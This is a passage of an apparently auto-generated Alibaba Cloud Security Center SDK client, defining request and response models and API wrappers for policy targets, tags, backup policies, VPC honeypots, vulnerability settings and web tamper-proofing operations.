  target?: string(name='Target', description='The information about the asset group to which the policy is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **TargetType**: the type of the asset to which the policy is applied. Set the value to **groupId**, which indicates that the policy is applied to an asset group.

*   **BindUuidCount**: the number of servers to which the policy is applied.

*   **Target**: the ID of the asset group.

*   **Flag**: the operation that you want to perform on the asset group. Valid values:

    *   **del**: removes the asset group from the policy.
    *   **add**: adds the asset group to the policy.', example='[{"Target":"9273980","BindUuidCount":5320,"TargetType":"groupId","Flag":"del"},{"Target":"9677606","TargetType":"groupId","Flag":"del"},{"Target":"10121607","BindUuidCount":7,"TargetType":"groupId","Flag":"add"},{"Target":"10670708","BindUuidCount":2,"TargetType":"groupId","Flag":"del"},{"Target":"11246338","BindUuidCount":6,"TargetType":"groupId","Flag":"del"},{"Target":"11291161","BindUuidCount":13,"TargetType":"groupId","Flag":"del"}]'),
  type?: string(name='Type', description='The configuration type. Set the value to **hc_strategy**.', example='hc_strategy'),
}

model ModifyStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0E147337-5B0B-5776-B0B6-D569DBA8F60F'),
}

model ModifyStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyTargetResponseBody(name='body'),
}

async function modifyStrategyTargetWithOptions(request: ModifyStrategyTargetRequest, runtime: Util.RuntimeOptions): ModifyStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategyTarget(request: ModifyStrategyTargetRequest): ModifyStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyTargetWithOptions(request, runtime);
}

model ModifyTagWithUuidRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the assets whose tags you want to modify. Valid values:

*   **ecs**: Elastic Compute Service (ECS) instances or servers that are not deployed on Alibaba Cloud.
*   **cloud_product**: Alibaba Cloud service.

>  If you do not specify this parameter, the default value **ecs** is used.', example='ecs'),
  tagId?: string(name='TagId', description='The ID of the tag whose name you want to change.

>  You can call the [DescribeGroupedTags](~~DescribeGroupedTags~~) operation to query the IDs of the tags.', example='3897941'),
  tagList?: string(name='TagList', description='The tag names that you want to change. Separate multiple tag names with commas (,).

>  You can call the [DescribeGroupedTags](~~DescribeGroupedTags~~) operation to query the names of the tags that are added to assets.', example='ac,ad'),
  uuidList?: string(name='UuidList', description='The UUIDs of the assets whose tags you want to modify. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets to which the tags are added. If you do not specify this parameter, the tags that are specified in **TagList** parameter are removed from all assets.', example='e2737dc3-78f4-4653-a986-dc5fad4b****,c189f0e3-df22-42d5-a73d-02c05667****'),
}

model ModifyTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='70C4B40D-D55E-4B7B-9992-8535E396B2F4'),
}

model ModifyTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyTagWithUuidResponseBody(name='body'),
}

async function modifyTagWithUuidWithOptions(request: ModifyTagWithUuidRequest, runtime: Util.RuntimeOptions): ModifyTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.tagId)) {
    query['TagId'] = request.tagId;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyTagWithUuid(request: ModifyTagWithUuidRequest): ModifyTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyTagWithUuidWithOptions(request, runtime);
}

model ModifyUniBackupPolicyRequest {
  accountName?: string(name='AccountName', example='sa'),
  accountPassword?: string(name='AccountPassword', example='Sa@****'),
  fullPlan?: map[string]any(name='FullPlan'),
  incPlan?: map[string]any(name='IncPlan'),
  policyId?: long(name='PolicyId', example='123'),
  policyName?: string(name='PolicyName', example='databak'),
  policyStatus?: string(name='PolicyStatus', example='enabled'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='1048576'),
}

model ModifyUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', example='sa'),
  accountPassword?: string(name='AccountPassword', example='Sa@****'),
  fullPlanShrink?: string(name='FullPlan'),
  incPlanShrink?: string(name='IncPlan'),
  policyId?: long(name='PolicyId', example='123'),
  policyName?: string(name='PolicyName', example='databak'),
  policyStatus?: string(name='PolicyStatus', example='enabled'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='1048576'),
}

model ModifyUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='3F6FAB39-5AF7-5B2C-A17D-16D52AE0****'),
}

model ModifyUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyUniBackupPolicyResponseBody(name='body'),
}

async function modifyUniBackupPolicyWithOptions(tmpReq: ModifyUniBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.policyStatus)) {
    query['PolicyStatus'] = request.policyStatus;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyUniBackupPolicy(request: ModifyUniBackupPolicyRequest): ModifyUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyUniBackupPolicyWithOptions(request, runtime);
}

model ModifyVpcHoneyPotRequest {
  honeyPotAction?: string(name='HoneyPotAction'),
  vpcId?: string(name='VpcId'),
}

model ModifyVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVpcHoneyPotResponseBody(name='body'),
}

async function modifyVpcHoneyPotWithOptions(request: ModifyVpcHoneyPotRequest, runtime: Util.RuntimeOptions): ModifyVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeyPotAction)) {
    query['HoneyPotAction'] = request.honeyPotAction;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVpcHoneyPot(request: ModifyVpcHoneyPotRequest): ModifyVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVpcHoneyPotWithOptions(request, runtime);
}

model ModifyVulConfigRequest {
  config?: string(name='Config', example='on'),
  type?: string(name='Type', example='cve'),
}

model ModifyVulConfigResponseBody = {
  requestId?: string(name='RequestId', example='24DDBE06-58FF-5E5E-9241-D2010D7913C1'),
}

model ModifyVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulConfigResponseBody(name='body'),
}

async function modifyVulConfigWithOptions(request: ModifyVulConfigRequest, runtime: Util.RuntimeOptions): ModifyVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulConfig(request: ModifyVulConfigRequest): ModifyVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulConfigWithOptions(request, runtime);
}

model ModifyVulTargetRequest {
  config?: string(name='Config', example='{\\"vulType\\":\\"sys\\"}'),
  target?: string(name='Target', example='[{\\"target\\": \\"9cd5c684-7201-4de5-ad2c-cea89a5e****\\", \\"targetType\\": \\"uuid\\", \\"flag\\": \\"add\\"}]'),
}

model ModifyVulTargetResponseBody = {
  requestId?: string(name='RequestId', example='38597320-A990-5444-9A4C-7A1269610C2A'),
}

model ModifyVulTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetResponseBody(name='body'),
}

async function modifyVulTargetWithOptions(request: ModifyVulTargetRequest, runtime: Util.RuntimeOptions): ModifyVulTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTarget(request: ModifyVulTargetRequest): ModifyVulTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetWithOptions(request, runtime);
}

model ModifyVulTargetConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable vulnerability detection. Valid values:

*   **on**: yes
*   **off**: no', example='off'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='inet-7c676676-06fa-442e-90fb-b802e5d6****'),
}

model ModifyVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1FF908BA-ADD8-5138-8595-614C6E3C6658'),
}

model ModifyVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetConfigResponseBody(name='body'),
}

async function modifyVulTargetConfigWithOptions(request: ModifyVulTargetConfigRequest, runtime: Util.RuntimeOptions): ModifyVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTargetConfig(request: ModifyVulTargetConfigRequest): ModifyVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetConfigWithOptions(request, runtime);
}

model ModifyVulWhitelistTargetRequest {
  id?: long(name='Id', example='2533681'),
  reason?: string(name='Reason', example='1221'),
  sourceIp?: string(name='SourceIp', example='42.120.75.150'),
  targetInfo?: string(name='TargetInfo', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
}

model ModifyVulWhitelistTargetResponseBody = {
  requestId?: string(name='RequestId', example='896AC4F0-C881-502B-BFC7-4751C5E3DEAA'),
}

model ModifyVulWhitelistTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulWhitelistTargetResponseBody(name='body'),
}

async function modifyVulWhitelistTargetWithOptions(request: ModifyVulWhitelistTargetRequest, runtime: Util.RuntimeOptions): ModifyVulWhitelistTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulWhitelistTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulWhitelistTarget(request: ModifyVulWhitelistTargetRequest): ModifyVulWhitelistTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulWhitelistTargetWithOptions(request, runtime);
}

model ModifyWebLockCreateConfigRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  inclusiveFile?: string(name='InclusiveFile'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  lang?: string(name='Lang'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockCreateConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockCreateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockCreateConfigResponseBody(name='body'),
}

async function modifyWebLockCreateConfigWithOptions(request: ModifyWebLockCreateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockCreateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockCreateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockCreateConfig(request: ModifyWebLockCreateConfigRequest): ModifyWebLockCreateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockCreateConfigWithOptions(request, runtime);
}

model ModifyWebLockDeleteConfigRequest {
  id?: int32(name='Id', description='The ID of the protected directory that you want to delete. 
> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.', example='12'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to delete the protected directory. 
> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the UUID of servers.', example='7f7fe9a2-55de-4b9d-a37a-0d981d36****'),
}

model ModifyWebLockDeleteConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='299D0992-271A-5750-ACEB-46D322862BFF'),
}

model ModifyWebLockDeleteConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockDeleteConfigResponseBody(name='body'),
}

/**
  * After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
  *
  * @param request ModifyWebLockDeleteConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfigWithOptions(request: ModifyWebLockDeleteConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockDeleteConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockDeleteConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
  *
  * @param request ModifyWebLockDeleteConfigRequest
  * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfig(request: ModifyWebLockDeleteConfigRequest): ModifyWebLockDeleteConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockDeleteConfigWithOptions(request, runtime);
}

model ModifyWebLockProcessStatusRequest {
  dealAll?: int32(name='DealAll'),
  operateInfo?: string(name='OperateInfo', example='[{"processPath":"/etc/test1","uuid":"0c1714dc-f7a3-4265-8364-7aa3fce8****"},{"processPath":"/etc/test2","uuid":"1cc45e7d-7698-4b2c-89d8-e8cba407****"}]'),
  processPath?: [ string ](name='ProcessPath'),
  status?: int32(name='Status'),
  uuid?: string(name='Uuid', example='bc8510e7-7327-4030-b75c-956e434d****'),
}

model ModifyWebLockProcessStatusResponseBody = {
  requestId?: string(name='RequestId', example='6A540B52-2441-5493-902B-37376C412776'),
}

model ModifyWebLockProcessStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockProcessStatusResponseBody(name='body'),
}

async function modifyWebLockProcessStatusWithOptions(request: ModifyWebLockProcessStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockProcessStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.operateInfo)) {
    query['OperateInfo'] = request.operateInfo;
  }
  if (!Util.isUnset(request.processPath)) {
    query['ProcessPath'] = request.processPath;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockProcessStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockProcessStatus(request: ModifyWebLockProcessStatusRequest): ModifyWebLockProcessStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockProcessStatusWithOptions(request, runtime);
}

model ModifyWebLockStartRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockStartResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockStartResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStartResponseBody(name='body'),
}

async function modifyWebLockStartWithOptions(request: ModifyWebLockStartRequest, runtime: Util.RuntimeOptions): ModifyWebLockStartResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStart',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStart(request: ModifyWebLockStartRequest): ModifyWebLockStartResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStartWithOptions(request, runtime);
}

model ModifyWebLockStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.71.XX.XX'),
  status?: string(name='Status', description='Specifies whether to enable or disable web tamper proofing for the specified server. Valid values:

*   **on**: enables web tamper proofing
*   **off**: disables web tamper proofing

>  After you disable web tamper proofing for the specified server, one quota is released.', example='on'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to enable or disable web tamper proofing. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-1234567****'),
}

model ModifyWebLockStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStatusResponseBody(name='body'),
}

async function modifyWebLockStatusWithOptions(request: ModifyWebLockStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStatus(request: ModifyWebLockStatusRequest): ModifyWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStatusWithOptions(request, runtime);
}

model ModifyWebLockUnbindRequest {
  uuid?: string(name='Uuid', example='8d217d3f-6999-43a6-a435-c7a6854180e9'),
}

model ModifyWebLockUnbindResponseBody = {
  requestId?: string(name='RequestId', example='F0A8A039-930D-5EC1-97C8-43F05776188A'),
}

model ModifyWebLockUnbindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUnbindResponseBody(name='body'),
}

async function modifyWebLockUnbindWithOptions(request: ModifyWebLockUnbindRequest, runtime: Util.RuntimeOptions): ModifyWebLockUnbindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUnbind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUnbind(request: ModifyWebLockUnbindRequest): ModifyWebLockUnbindResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUnbindWithOptions(request, runtime);
}

model ModifyWebLockUpdateConfigRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  id?: int32(name='Id'),
  inclusiveFile?: string(name='InclusiveFile'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  lang?: string(name='Lang'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockUpdateConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockUpdateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUpdateConfigResponseBody(name='body'),
}

